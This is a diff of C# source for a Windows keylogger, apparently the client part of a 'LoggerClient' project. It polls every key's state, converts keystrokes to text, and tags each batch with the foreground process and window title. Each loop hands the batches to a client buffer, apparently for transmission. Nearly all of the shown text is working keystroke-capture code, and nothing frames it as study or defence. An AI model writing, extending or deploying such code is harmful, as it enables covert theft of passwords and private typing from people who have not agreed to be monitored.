@@ -1,33 +1,85 @@
 ﻿using System;
-using System.Runtime.InteropServices;
+using System.Collections.Generic;
+using System.Linq;
 using System.Text;
-using System.Threading;
-using System.IO;
+using System.Threading.Tasks;
+using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using System.Diagnostics;
+using System.Threading;
 
 namespace LoggerClient
 {
-    public class KeyLogger
+    class KeyLogger1
     {
         [DllImport("user32.dll")]
-        private static extern int GetAsyncKeyState(Int32 i);
+        static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);
         [DllImport("user32.dll")]
-        private static extern IntPtr GetForegroundWindow();
-        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+        static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+        [DllImport("user32.dll")]
+        private static extern int GetAsyncKeyState(Int32 i);
         [DllImport("user32.dll")]
         public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);
         [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
         static extern int GetWindowTextLength(IntPtr hWnd);
+        [DllImport("user32.dll")]
+        static extern bool UnhookWinEvent(IntPtr hWinEventHook);
+        private const uint WINEVENT_OUTOFCONTEXT = 0;
+        private const uint EVENT_SYSTEM_FOREGROUND = 3;
 
         private static StringBuilder userActions = new StringBuilder();
+        private static Process currProcess = setForegroundProcess();
         private static Process priorProcess;
+        private static WinEventDelegate dele = null;
+        private static IntPtr window;
+        private static IntPtr priorWindow;
 
+        delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd,
+                                        int idObject, int idChild, uint dwEventThread, 
+                                        uint dwmsEventTime);
+
+        private static void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime) //STATIC
+        {
+            setForegroundProcess();
+        }
+
+        private static Process setForegroundProcess()
+        {
+            window = GetForegroundWindow();
+            if (window == null)
+                return null;
+
+            uint pid;
+            GetWindowThreadProcessId(window, out pid);
+
+            foreach (Process p in Process.GetProcesses())
+            {
+                if (p.Id == pid)
+                {
+                    currProcess = p;
+                    return p;
+                }
+            }
+
+            return null;
+        }
+        
+        public static void run1()
+        {
+            dele = new WinEventDelegate(WinEventProc);
+            IntPtr m_hhook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND,
+                EVENT_SYSTEM_FOREGROUND, IntPtr.Zero,
+                dele, 0, 0, WINEVENT_OUTOFCONTEXT);
+            //Application.Run();
+            MessageBox.Show("Tracking focus, close message box to exit.");
+
+            UnhookWinEvent(m_hhook);
+        }
         public static void run()
         {
             StringBuilder keysPressed = new StringBuilder();
-            bool isSwitchedWindow = false;
 
             while (true)
             {
@@ -40,6 +92,7 @@ namespace LoggerClient
                     {
                         shift = true;
                     }
+
                     bool caps = Console.CapsLock;
 
                     bool isBigChar = shift | caps;
@@ -48,31 +101,33 @@ namespace LoggerClient
 
                     if (state != 0) //state == 1 || state == -32767
                     {
+                        keysPressed.Append(specialKeyInterpreter(i, shift, caps));
+
+                        if (((Keys)i).ToString().Length == 1)
+                        {
+                            if (isBigChar)
+                                keysPressed.Append(((Keys)i).ToString().ToUpper());
+                            else
+                                keysPressed.Append(((Keys)i).ToString().ToLower());
+                        }
+                        /* else
+                        {
+                            keysPressed.AppendFormat("<{0}>", ((Keys)i).ToString());
+                        }
+                        */
+
                         if (priorProcess == null)
                         {
-                            IntPtr startWindow = GetForegroundWindow();
-                            uint procid;
-                            GetWindowThreadProcessId(startWindow, out procid);
-                            priorProcess = Process.GetProcessById((int)procid);
+                            priorProcess = currProcess;
+                            priorWindow = window;
                         }
 
-                        IntPtr currWindow = GetForegroundWindow();
-                        uint pid;
-                        GetWindowThreadProcessId(currWindow, out pid);
-                        Process currProcess = Process.GetProcessById((int)pid);
-
-                        if (currProcess.Id != priorProcess.Id)
-                        {
-                            isSwitchedWindow = true;
-                        }
-
-                        if (keysPressed.Length > 10 || isSwitchedWindow)
+                        if (priorProcess.Id != currProcess.Id)
                         {
                             string processName = priorProcess.ProcessName;
-
-                            StringBuilder header = new StringBuilder(GetWindowTextLength(currWindow) + 1);
-                            GetWindowText(currWindow, header, header.Capacity);
-                            DateTime processStartTimeUTC = priorProcess.StartTime.ToUniversalTime();
+                            StringBuilder header = new StringBuilder(GetWindowTextLength(priorWindow) + 1);
+                            GetWindowText(priorWindow, header, header.Capacity);
+                            DateTime processStartTimeUTC = currProcess.StartTime.ToUniversalTime();
 
                             userActions.AppendFormat("[{0}|{1}]|[USER INPUT]| " +
                                                     "Process:{2} |Header: {3}|Input: {4}",
@@ -86,31 +141,38 @@ namespace LoggerClient
 
                             keysPressed.Clear();
                             header.Clear();
-                            isSwitchedWindow = false;
+
+                            priorProcess = currProcess;
+                            priorWindow = window;
                         }
-
-
-                        keysPressed.Append(specialKeyInterpreter(i, shift, caps));
-                     
-                        if (((Keys)i).ToString().Length == 1)
+                        else if (keysPressed.Length > 10)
                         {
-                            if (isBigChar)
-                                keysPressed.Append(((Keys)i).ToString().ToUpper());
-                            else
-                                keysPressed.Append(((Keys)i).ToString().ToLower());
+                            string processName = currProcess.ProcessName;
+                            StringBuilder header = new StringBuilder(GetWindowTextLength(window) + 1);
+                            GetWindowText(window, header, header.Capacity);
+                            DateTime processStartTimeUTC = currProcess.StartTime.ToUniversalTime();
+
+                            userActions.AppendFormat("[{0}|{1}]|[USER INPUT]| " +
+                                                    "Process:{2} |Header: {3}|Input: {4}",
+                                                    processStartTimeUTC.ToShortDateString(),
+                                                    processStartTimeUTC.ToShortTimeString(),
+                                                    processName,
+                                                    header,
+                                                    keysPressed
+                                                    );
+                            userActions.Append("\n");
+
+                            keysPressed.Clear();
+                            header.Clear();
                         }
-                        /* else
-                         {
-                             keysPressed.AppendFormat("<{0}>", ((Keys)i).ToString());
-                         }
-                         */
 
                     }
+
                 }
 
                 Client.appendToBuffer(userActions);
                 userActions.Clear();
-                Thread.Sleep(100);
+                Thread.Sleep(1000);
             }
         }
 
@@ -333,7 +395,10 @@ namespace LoggerClient
 
             return keyPressed;
         }
-
     }
-
 }
+
+
+
+
+
